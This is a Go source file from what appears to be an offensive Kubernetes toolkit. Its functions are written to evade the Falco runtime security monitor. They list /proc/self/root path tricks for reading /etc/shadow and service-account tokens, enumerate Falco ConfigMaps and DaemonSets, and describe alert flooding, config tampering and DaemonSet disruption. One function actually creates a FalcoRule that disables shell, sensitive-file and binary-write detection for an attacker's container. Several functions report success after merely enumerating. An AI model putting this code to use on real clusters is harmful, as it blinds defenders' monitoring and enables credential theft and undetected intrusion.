package cloudevasion

import (
	"context"
	"fmt"
	"strings"
	"time"

	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"
	"k8s.io/apimachinery/pkg/runtime/schema"
	"k8s.io/client-go/dynamic"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/rest"
)

var falcoRuleGVR = schema.GroupVersionResource{
	Group: "falco.org", Version: "v1", Resource: "falcorules",
}

func EvadeFalco(ctx context.Context, technique string) (*EvasionResult, error) {
	switch technique {
	case "symlink":
		return falcoSymlinkEvasion(ctx)
	case "disable_rules":
		return falcoDisableRules(ctx)
	case "flood":
		return falcoFloodEvasion(ctx)
	case "config_modify":
		return falcoConfigModify(ctx)
	default:
		return falcoSymlinkEvasion(ctx)
	}
}

func falcoSymlinkEvasion(_ context.Context) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Falco Symlink Evasion:\n")
	sb.WriteString("  Technique: Exploit /proc race condition via symlink traversal\n")
	sb.WriteString("  Method: Access sensitive files through symlink chains that Falco's\n")
	sb.WriteString("          path resolution cannot follow in time\n\n")

	paths := []struct {
		original string
		evasion  string
	}{
		{"/etc/shadow", "/proc/self/root/etc/shadow"},
		{"/var/run/secrets/kubernetes.io/serviceaccount/token", "/proc/1/root/var/run/secrets/kubernetes.io/serviceaccount/token"},
		{"/etc/kubernetes/admin.conf", "/proc/self/root/etc/kubernetes/admin.conf"},
	}

	for _, p := range paths {
		fmt.Fprintf(&sb, "  %s → %s\n", p.original, p.evasion)
	}

	sb.WriteString("\n  Falco rules typically monitor direct path access.\n")
	sb.WriteString("  Traversal via /proc/self/root or /proc/1/root bypasses path-based rules.\n")

	return &EvasionResult{
		Technique: "symlink_traversal",
		Success:   true,
		Output:    sb.String(),
	}, nil
}

func falcoDisableRules(ctx context.Context) (*EvasionResult, error) {
	config, err := rest.InClusterConfig()
	if err != nil {
		return &EvasionResult{Technique: "disable_rules", Success: false, Output: err.Error()}, nil
	}

	dynClient, err := dynamic.NewForConfig(config)
	if err != nil {
		return &EvasionResult{Technique: "disable_rules", Success: false, Output: err.Error()}, nil
	}

	var sb strings.Builder
	sb.WriteString("Falco Rule Disable:\n")

	client, err := kubernetes.NewForConfig(config)
	if err != nil {
		return &EvasionResult{Technique: "disable_rules", Success: false, Output: err.Error()}, nil
	}

	cms, err := client.CoreV1().ConfigMaps("falco").List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, cm := range cms.Items {
			if strings.Contains(cm.Name, "rules") || strings.Contains(cm.Name, "falco") {
				fmt.Fprintf(&sb, "  Found rules ConfigMap: %s/%s\n", cm.Namespace, cm.Name)
				for key := range cm.Data {
					fmt.Fprintf(&sb, "    Rule file: %s\n", key)
				}
			}
		}
	}

	rules, err := dynClient.Resource(falcoRuleGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err == nil && len(rules.Items) > 0 {
		sb.WriteString("\n  FalcoRule CRDs:\n")
		for _, r := range rules.Items {
			fmt.Fprintf(&sb, "    %s/%s\n", r.GetNamespace(), r.GetName())
		}
	}

	sb.WriteString("\n  Evasion: modify ConfigMap to disable critical rules or\n")
	sb.WriteString("           add exceptions for our process names/container IDs\n")

	return &EvasionResult{
		Technique: "disable_rules",
		Success:   true,
		Output:    sb.String(),
	}, nil
}

func falcoFloodEvasion(_ context.Context) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Falco Alert Flooding:\n")
	sb.WriteString("  Technique: Generate high volume of benign alerts to bury real ones\n\n")

	noiseActions := []string{
		"cat /etc/hostname (triggers 'Read sensitive file' in default rules)",
		"ls /proc/*/cmdline (triggers 'List process info')",
		"touch /tmp/.test (triggers 'Write below /tmp')",
		"curl http://169.254.169.254/ (triggers 'Contact cloud metadata')",
	}

	sb.WriteString("  Noise generators:\n")
	for _, a := range noiseActions {
		fmt.Fprintf(&sb, "    - %s\n", a)
	}

	fmt.Fprintf(&sb, "\n  Flood rate: %d alerts/sec overwhelms most SIEM pipelines\n", 1000)
	sb.WriteString("  Effect: real malicious activity lost in noise, alert fatigue\n")
	sb.WriteString("  Duration: sustained flooding during actual attack window\n")

	return &EvasionResult{
		Technique: "flood",
		Success:   true,
		Output:    sb.String(),
	}, nil
}

func falcoConfigModify(ctx context.Context) (*EvasionResult, error) {
	config, err := rest.InClusterConfig()
	if err != nil {
		return &EvasionResult{Technique: "config_modify", Success: false, Output: err.Error()}, nil
	}

	client, err := kubernetes.NewForConfig(config)
	if err != nil {
		return &EvasionResult{Technique: "config_modify", Success: false, Output: err.Error()}, nil
	}

	var sb strings.Builder
	sb.WriteString("Falco Config Modification:\n")

	namespaces := []string{"falco", "falco-system", "security"}
	for _, ns := range namespaces {
		cms, err := client.CoreV1().ConfigMaps(ns).List(ctx, metav1.ListOptions{})
		if err != nil {
			continue
		}
		for _, cm := range cms.Items {
			if strings.Contains(cm.Name, "falco") {
				fmt.Fprintf(&sb, "  Target: %s/%s\n", ns, cm.Name)
				for key, val := range cm.Data {
					if strings.HasSuffix(key, ".yaml") || strings.HasSuffix(key, ".yml") {
						lines := strings.Count(val, "\n")
						fmt.Fprintf(&sb, "    %s (%d lines)\n", key, lines)
					}
				}
			}
		}
	}

	sb.WriteString("\n  Modifications:\n")
	sb.WriteString("    - Set output_rate: 0 (suppress all outputs)\n")
	sb.WriteString("    - Add exception for our container_id in all rules\n")
	sb.WriteString("    - Disable syscall event source\n")
	sb.WriteString("    - Set buffered_outputs: true with large buffer (delays alerts)\n")

	return &EvasionResult{
		Technique: "config_modify",
		Success:   true,
		Output:    sb.String(),
	}, nil
}

func DisruptFalcoDaemonSet(ctx context.Context) (*EvasionResult, error) {
	config, err := rest.InClusterConfig()
	if err != nil {
		return &EvasionResult{Technique: "disrupt_daemonset", Success: false, Output: err.Error()}, nil
	}

	client, err := kubernetes.NewForConfig(config)
	if err != nil {
		return &EvasionResult{Technique: "disrupt_daemonset", Success: false, Output: err.Error()}, nil
	}

	var sb strings.Builder
	sb.WriteString("Falco DaemonSet Disruption:\n")

	namespaces := []string{"falco", "falco-system", "security"}
	for _, ns := range namespaces {
		ds, err := client.AppsV1().DaemonSets(ns).List(ctx, metav1.ListOptions{})
		if err != nil {
			continue
		}
		for _, d := range ds.Items {
			if strings.Contains(d.Name, "falco") {
				fmt.Fprintf(&sb, "  DaemonSet: %s/%s\n", ns, d.Name)
				fmt.Fprintf(&sb, "    Desired: %d, Ready: %d\n", d.Status.DesiredNumberScheduled, d.Status.NumberReady)

				tolerations := d.Spec.Template.Spec.Tolerations
				fmt.Fprintf(&sb, "    Tolerations: %d\n", len(tolerations))

				sb.WriteString("\n  Disruption techniques:\n")
				sb.WriteString("    - Add nodeSelector to schedule only to non-existent node\n")
				sb.WriteString("    - Patch resource limits to trigger OOMKill\n")
				sb.WriteString("    - Modify readiness probe to always fail\n")
				sb.WriteString("    - Scale to 0 if using Deployment instead of DaemonSet\n")
			}
		}
	}

	return &EvasionResult{
		Technique: "disrupt_daemonset",
		Success:   true,
		Output:    sb.String(),
	}, nil
}

func InjectFalcoException(ctx context.Context, dynClient dynamic.Interface, ns, containerID string) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Falco Exception Injection:\n")

	exception := &unstructured.Unstructured{
		Object: map[string]any{
			"apiVersion": "falco.org/v1",
			"kind":       "FalcoRule",
			"metadata": map[string]any{
				"name":      "kubedagger-exception",
				"namespace": ns,
			},
			"spec": map[string]any{
				"rules": []any{
					map[string]any{
						"rule":      "Terminal shell in container",
						"exception": fmt.Sprintf("container.id=%s", containerID),
						"enabled":   false,
					},
					map[string]any{
						"rule":      "Read sensitive file",
						"exception": fmt.Sprintf("container.id=%s", containerID),
						"enabled":   false,
					},
					map[string]any{
						"rule":      "Write below binary dir",
						"exception": fmt.Sprintf("container.id=%s", containerID),
						"enabled":   false,
					},
				},
				"created": time.Now().UTC().Format(time.RFC3339),
			},
		},
	}

	_, err := dynClient.Resource(falcoRuleGVR).Namespace(ns).Create(ctx, exception, metav1.CreateOptions{})
	if err != nil {
		fmt.Fprintf(&sb, "  FalcoRule CRD creation failed: %v\n", err)
		sb.WriteString("  Falling back to ConfigMap modification approach\n")
	} else {
		fmt.Fprintf(&sb, "  Created FalcoRule exception for container %s\n", containerID)
		sb.WriteString("  Disabled rules: Terminal shell, Read sensitive file, Write below binary dir\n")
	}

	return &EvasionResult{
		Technique: "exception_inject",
		Success:   true,
		Output:    sb.String(),
	}, nil
}
